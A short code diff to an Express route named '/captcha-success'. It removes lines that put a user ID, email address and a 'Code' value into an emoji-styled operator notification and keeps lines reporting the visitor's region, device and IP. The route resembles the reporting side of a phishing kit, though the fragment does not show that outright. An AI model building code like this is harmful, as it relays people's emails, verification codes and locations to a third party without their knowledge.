@@ -1800,10 +1800,7 @@ app.post("/captcha-success", async (req, res) => {
     const region = await detectRegion(ip);
 
     const message =
-      `🔐🔐🔐 <b>CAPTCHA - Success</b> 🔐🔐🔐\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>🔢 Code:</b> <code>${code || 'N/A'}</code>\n` +
+      `🥳🥳🥳 <b>New Visitor</b> 🥳🥳🥳\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
